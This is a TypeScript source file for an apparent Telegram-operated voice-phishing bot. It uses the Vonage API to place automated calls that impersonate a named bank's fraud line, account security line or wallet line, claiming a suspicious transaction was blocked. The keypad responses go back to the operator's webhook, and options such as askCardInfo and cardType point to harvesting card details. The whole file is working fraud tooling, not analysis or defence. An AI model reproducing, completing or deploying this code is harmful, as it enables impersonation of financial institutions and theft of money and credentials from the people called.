/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import path from 'path';
import Vonage from '@vonage/server-sdk';
import { bot } from '..';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const vonage = new Vonage({
  apiKey: process.env.VONAGE_API_KEY as string,
  apiSecret: process.env.VONAGE_API_SECRET as string,
  applicationId: process.env.VONAGE_APPLICATION_ID,
  privateKey: path.join(
    __dirname,
    process.env.NODE_ENV === 'production'
      ? '../../vonage_private_key_prod.key'
      : '../../vonage_private_key.key',
  ),
});

interface CallInputType {
  institutionName: string;
  to: string;
  from: string;
  chatId: number;
  step: string;
  wallet?: string;
  cardType?: string;
  askCardInfo?: string;
}

const nccoPrep = (
  institutionName: string,
  language: string,
  step: string,
  chatId: number,
  wallet?: string,
  cardType?: string,
  askCardInfo?: string,
): any => {
  switch (step) {
    case 'bank':
      return [
        {
          action: 'talk',
          text: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            timeOut: 10,
            maxDigits: 1,
          },
        },
      ];
    case 'account':
      return [
        {
          action: 'talk',
          text: `This is a call from ${institutionName.toUpperCase()} account security line. We have BLOCKED a recent SUSPICIOUS login attempt on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            timeOut: 10,
            maxDigits: 1,
          },
        },
      ];
    case 'pay':
      return [
        {
          action: 'talk',
          text: `This is a call from ${institutionName.toUpperCase()} mobile wallet line. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${
              process.env.ENDPOINT_URL
            }/vonage-webhook/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            timeOut: 10,
            maxDigits: 1,
          },
        },
      ];
    case 'card':
      return [
        {
          action: 'talk',
          text: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
          style: 2,
          language,
          bargeIn: true,
        },
        {
          eventUrl: [
            `${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          ],
          action: 'input',
          type: ['dtmf'],
          dtmf: {
            timeOut: 10,
            maxDigits: 1,
          },
        },
      ];
    default:
      break;
  }
};

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const vonageMakeACall: any = async ({
  institutionName,
  to,
  from,
  step,
  wallet,
  cardType,
  askCardInfo,
  chatId,
}: CallInputType) => {
  const ncco =
    /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
      to,
    )
      ? nccoPrep(
          institutionName,
          'en-GB',
          step,
          chatId,
          wallet,
          cardType,
          askCardInfo,
        )
      : nccoPrep(
          institutionName,
          'en-US',
          step,
          chatId,
          wallet,
          cardType,
          askCardInfo,
        );

  // @ts-expect-error create actually exist on vonage object
  return vonage.calls.create(
    {
      event_url: [`${process.env.ENDPOINT_URL}/vonage-webhook/${chatId}`],
      to: [
        {
          type: 'phone',
          number: to,
        },
      ],
      from: {
        type: 'phone',
        number: from,
      },
      ncco,
    },
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    async (error: any, response: any) => {
      if (error) {
        await bot.telegram.sendMessage(
          chatId,
          `Something went wrong try again later.`,
        );
        await bot.context.scene?.enter('super-wizard');
      }
      if (response) {
        if (response.status === 'started') {
          await bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
        }
      }
    },
  );
};
